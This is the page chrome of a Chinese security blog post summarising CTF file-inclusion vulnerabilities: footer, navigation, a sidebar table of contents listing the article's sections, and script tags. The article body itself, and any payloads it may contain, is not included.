class="link"><strong>本文链接：</strong> <a href="https://p1kap1.github.io/knowledge/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="ctf文件包含总结">https://p1kap1.github.io/knowledge/文件包含/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/knowledge/%E8%A7%A3%E5%86%B3git%E6%8F%90%E4%BA%A4%E6%88%96%E5%85%8B%E9%9A%86%E6%8A%A5%E9%94%99/" itemprop="url" rel="prev" data-background-image="&#x2F;covers&#x2F;git.jpg" title="解决git提交或克隆报错"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> 杂谈小记</span><h3>解决git提交或克隆报错</h3></a></div><div class="item right"><a href="/CTF/web/ctfshow/" itemprop="url" rel="next" data-background-image="&#x2F;covers&#x2F;ctfshow.jpg" title="CTFSHOW元旦水友赛复现"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> 无敌的Web</span><h3>CTFSHOW元旦水友赛复现</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">文件包含漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.2.</span> <span class="toc-text">文件包含漏洞基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">1.2.1.</span> <span class="toc-text">文件包含漏洞是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E8%88%AC%E4%BC%9A%E4%BD%BF%E7%94%A8%E4%BB%A5%E4%B8%8B%E5%87%BD%E6%95%B0%E6%9D%A5%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.2.2.</span> <span class="toc-text">一般会使用以下函数来进行文件包含：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E5%BC%A0%E8%A1%A8%E4%BA%86%E8%A7%A3php%E7%9A%84%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.2.3.</span> <span class="toc-text">一张表了解 php 的伪协议：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%84%E4%B8%AA%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.2.4.</span> <span class="toc-text">各个协议详解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E4%BA%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%88%86%E7%B1%BB%E6%9C%89%E4%B8%AA%E7%AC%BC%E7%BB%9F%E7%9A%84%E5%88%86%E7%B1%BB"><span class="toc-number">1.2.5.</span> <span class="toc-text">对于文件包含的分类有个笼统的分类：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.3.</span> <span class="toc-text">本地文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84"><span class="toc-number">1.3.1.</span> <span class="toc-text">敏感文件路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.2.</span> <span class="toc-text">伪协议读文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E6%9C%89%E4%B8%89%E7%A7%8D"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">常见的过滤绕过方式有三种：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#00%E6%88%AA%E6%96%AD%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">%00 截断文件包含</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B7%AF%E5%BE%84%E9%95%BF%E5%BA%A6%E6%88%AA%E6%96%AD%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.3.2.3.</span> <span class="toc-text">路径长度截断文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E7%BB%93%E6%9E%9C"><span class="toc-number">1.3.2.3.1.</span> <span class="toc-text">测试结果</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%82%B9%E5%8F%B7%E6%88%AA%E6%96%AD%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.3.2.4.</span> <span class="toc-text">点号截断文件包含</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A3%B8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.3.3.</span> <span class="toc-text">裸文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">利用条件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.3.4.</span> <span class="toc-text">日志文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">中间件日志文件包含</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ssh%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.3.4.2.</span> <span class="toc-text">ssh 日志文件包含</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.3.5.</span> <span class="toc-text">session 文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-2"><span class="toc-number">1.3.5.1.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8E-session-%E6%9C%89%E5%85%B3%E7%9A%84%E5%87%A0%E4%B8%AA-php-%E9%80%89%E9%A1%B9"><span class="toc-number">1.3.5.2.</span> <span class="toc-text">与 SESSION 有关的几个 PHP 选项</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-session-upload-progress-%E4%B8%8A%E4%BC%A0-session"><span class="toc-number">1.3.5.3.</span> <span class="toc-text">利用 Session Upload Progress 上传 Session</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-session-upload-progress-%E6%9D%A5-getshell"><span class="toc-number">1.3.5.4.</span> <span class="toc-text">利用 Session Upload Progress 来 Getshell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.3.6.</span> <span class="toc-text">临时文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="toc-number">1.3.6.1.</span> <span class="toc-text">全局变量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E7%9B%AE%E5%BD%95"><span class="toc-number">1.3.6.2.</span> <span class="toc-text">存储目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E5%90%8D%E8%A7%84%E5%88%99"><span class="toc-number">1.3.6.3.</span> <span class="toc-text">命名规则</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="toc-number">1.3.6.4.</span> <span class="toc-text">利用原理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.4.</span> <span class="toc-text">远程文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-3"><span class="toc-number">1.4.1.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BE%E4%B8%AA%E4%BE%8B%E5%AD%90"><span class="toc-number">1.4.2.</span> <span class="toc-text">举个例子</span></a></li></ol></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li><a href="/knowledge/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%A5%87%E6%80%9D%E5%A6%99%E6%83%B3/" rel="bookmark" title="php反序列化的奇思妙想no.1">php反序列化的奇思妙想no.1</a></li><li><a href="/knowledge/Linux%E5%AF%B9%E6%96%87%E4%BB%B6%E7%9A%84%E8%AF%BB%E5%8F%96%E5%91%BD%E4%BB%A4/" rel="bookmark" title="Linux对文件读取的命令">Linux对文件读取的命令</a></li><li><a href="/knowledge/web%E5%BC%80%E5%8F%91%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/NO.1/" rel="bookmark" title="NO.1-html、css篇">NO.1-html、css篇</a></li><li><a href="/knowledge/%E8%A7%A3%E5%86%B3git%E6%8F%90%E4%BA%A4%E6%88%96%E5%85%8B%E9%9A%86%E6%8A%A5%E9%94%99/" rel="bookmark" title="解决git提交或克隆报错">解决git提交或克隆报错</a></li><li class="active"><a href="/knowledge/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="bookmark" title="ctf文件包含总结">ctf文件包含总结</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="p1kap1" data-src="/images/avatar.jpg"><p class="name" itemprop="name">p1kap1</p><div class="description" itemprop="description">明镜止水之心</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">19</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">6</span> <span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">13</span> <span class="name">标签</span></a></div></nav><div class="social"><span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Axa2FwMQ==" title="https:&#x2F;&#x2F;github.com&#x2F;p1kap1"><i class="ic i-github"></i></span> <span class="exturl item music" data-url="aHR0cHM6Ly9tdXNpYy4xNjMuY29tLyMvdXNlci9ob21lP2lkPTE5MDA5MTg3MjE=" title="https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;user&#x2F;home?id&#x3D;1900918721"><i class="ic i-cloud-music"></i></span></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>friends</a></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/knowledge/%E8%A7%A3%E5%86%B3git%E6%8F%90%E4%BA%A4%E6%88%96%E5%85%8B%E9%9A%86%E6%8A%A5%E9%94%99/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/CTF/web/ctfshow/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于 CTF">CTF</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/reverse/" title="分类于 逆天的reverse">逆天的reverse</a></div><span><a href="/CTF/reverse/NewStar2023week1/" title="NewStar2023week1-reverse">NewStar2023week1-reverse</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于 CTF">CTF</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/web/" title="分类于 无敌的Web">无敌的Web</a></div><span><a href="/CTF/web/SICTF2023-Round2/" title="SICTF2023-Round2">SICTF2023-Round2</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/knowledge/" title="分类于 杂谈小记">杂谈小记</a></div><span><a href="/knowledge/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="ctf文件包含总结">ctf文件包含总结</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/knowledge/" title="分类于 杂谈小记">杂谈小记</a></div><span><a href="/knowledge/Linux%E5%AF%B9%E6%96%87%E4%BB%B6%E7%9A%84%E8%AF%BB%E5%8F%96%E5%91%BD%E4%BB%A4/" title="Linux对文件读取的命令">Linux对文件读取的命令</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于 CTF">CTF</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/web/" title="分类于 无敌的Web">无敌的Web</a></div><span><a href="/CTF/web/NewStar2023week1-5/" title="NewStar2023-web-week1~5">NewStar2023-web-week1~5</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/knowledge/" title="分类于 杂谈小记">杂谈小记</a></div><span><a href="/knowledge/%E8%A7%A3%E5%86%B3git%E6%8F%90%E4%BA%A4%E6%88%96%E5%85%8B%E9%9A%86%E6%8A%A5%E9%94%99/" title="解决git提交或克隆报错">解决git提交或克隆报错</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于 CTF">CTF</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/web/" title="分类于 无敌的Web">无敌的Web</a></div><span><a href="/CTF/web/NSS%E9%A2%98%E8%AE%B0-web%E7%AF%87(2)/" title="NSS题记-web篇(2)">NSS题记-web篇(2)</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于 CTF">CTF</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/web/" title="分类于 无敌的Web">无敌的Web</a></div><span><a href="/CTF/web/polar2023%E4%B8%AA%E4%BA%BA%E8%B5%9B/" title="polar2023个人赛">polar2023个人赛</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/knowledge/" title="分类于 杂谈小记">杂谈小记</a></div><span><a href="/knowledge/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%A5%87%E6%80%9D%E5%A6%99%E6%83%B3/" title="php反序列化的奇思妙想no.1">php反序列化的奇思妙想no.1</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于 CTF">CTF</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/web/" title="分类于 无敌的Web">无敌的Web</a></div><span><a href="/CTF/web/FSCTF/" title="FSCTF 2023-wp">FSCTF 2023-wp</a></span></li></ul></div></div><div class="status"><div class="copyright">&copy; 2010 – <span itemprop="copyrightYear">2024</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">p1kap1 @ Clear Mind</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="站点总字数">291k 字</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="站点阅读时长">4:24</span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"knowledge/文件包含/",favicon:{show:"（●´3｀●）やれやれだぜ",hide:"(´Д｀)大変だ！"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html>